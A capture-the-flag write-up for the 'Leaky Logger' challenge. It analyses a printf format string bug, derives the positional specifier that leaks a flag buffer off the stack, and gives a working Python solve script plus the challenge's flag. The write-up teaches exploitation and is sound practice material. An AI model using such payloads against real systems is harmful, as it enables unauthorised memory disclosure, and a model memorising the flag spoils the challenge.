# Leaky Logger - Solution Writeup

## Challenge Information
- **CTF:** RSTCON CTF
- **Challenge Name:** Leaky Logger
- **Points:** 10
- **Author:** f8al
- **Category:** Binary Exploitation / Reverse Engineering
- **Provided Files:** `logger` (x86-64 ELF), `description.txt`
- **Remote Services:**
  - Mirror 1: `nc 18.215.143.250 9002`
  - Mirror 2: `nc 18.145.136.91 9002`

---

## 1. Summary & Vulnerability Analysis
The provided binary `logger` is a 64-bit x86-64 Linux ELF. Disassembly of `main` reveals:
1. At startup, the program opens `flag.txt` using `fopen()`.
2. It zeroes out an 80-byte buffer on the stack at `[rbp - 0x60]` using `memset()` and reads up to 80 bytes of the flag into it via `fgets(flag_buf, 0x50, fp)`.
3. It closes the file with `fclose()`.
4. It prompts the user for input and reads up to 512 bytes into a stack buffer at `[rbp - 0x260]` via `fgets(user_buf, 0x200, stdin)`.
5. Finally, it prints the user input directly:
   ```c
   printf(user_buf); // Uncontrolled format string vulnerability
   ```

Because `user_buf` is passed directly as the format string argument (`rdi`) to `printf()`, we can supply format specifiers (e.g. `%p`, `%llx`, `%s`) to read arbitrary stack memory.

---

## 2. Stack Layout & Positional Specifier Derivation

Under the x86-64 System V AMD64 ABI:
- 1st parameter: `rdi` (format string pointer: `rbp - 0x260` = `rsp`)
- 2nd to 6th parameters (register slots):
  - `%1$`: `rsi`
  - `%2$`: `rdx`
  - `%3$`: `rcx`
  - `%4$`: `r8`
  - `%5$`: `r9`
- 7th parameter onwards (stack slots):
  - `%6$`: `[rsp]` (offset 0, pointing to `user_buf` at `rbp - 0x260`)

The flag buffer is located at `[rbp - 0x60]`.
The offset in bytes between the top of the stack (`[rsp]` = `rbp - 0x260`) and the flag buffer (`rbp - 0x60`) is:
$$\text{Offset} = 0x260 - 0x60 = 0x200 = 512\text{ bytes}$$

Converting 512 bytes into 8-byte 64-bit words:
$$\frac{512}{8} = 64\text{ words}$$

Since the first stack slot at `[rsp]` is `%6$`, the flag buffer begins at stack slot:
$$6 + 64 = 70\implies \%70\$p$$

---

## 3. Flag Extraction

Sending positional format specifiers `%70$p %71$p %72$p %73$p %74$p\n`:

```
logged: 0x667b6e6f63747372 0x74735f74616d7230 0x336c5f73676e3172 0x735f6568745f6b61 0x7d6b636174
```

Converting each 64-bit little-endian integer to ASCII:
- `0x667b6e6f63747372` $\to$ `rstcon{f`
- `0x74735f74616d7230` $\to$ `0rmat_st`
- `0x336c5f73676e3172` $\to$ `r1ngs_l3`
- `0x735f6568745f6b61` $\to$ `ak_the_s`
- `0x7d6b636174` $\to$ `tack}`

Concatenating all segments produces the flag:
```
rstcon{f0rmat_str1ngs_l3ak_the_stack}
```

---

## 4. Exploit Script (`solve.py`)

```python
#!/usr/bin/env python3
import socket
import sys

def get_flag(host='18.215.143.250', port=9002):
    payload = "%70$p %71$p %72$p %73$p %74$p\n"
    s = socket.create_connection((host, port), timeout=10)
    s.recv(1024)
    s.sendall(payload.encode('ascii'))
    
    response = b""
    while b"\n" not in response or b"logged:" not in response:
        chunk = s.recv(1024)
        if not chunk:
            break
        response += chunk
    s.close()
    
    text = response.decode('utf-8', errors='replace').strip()
    tokens = text.split("logged:")[-1].strip().split()
    
    flag_bytes = bytearray()
    for t in tokens:
        val = int(t, 16)
        flag_bytes.extend(val.to_bytes(8, 'little'))
        
    flag = flag_bytes.rstrip(b"\x00").decode('ascii', errors='replace')
    print(f"[+] Flag: {flag}")
    return flag

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '18.215.143.250'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9002
    get_flag(host, port)
```

---

## Flag
```
rstcon{f0rmat_str1ngs_l3ak_the_stack}
```
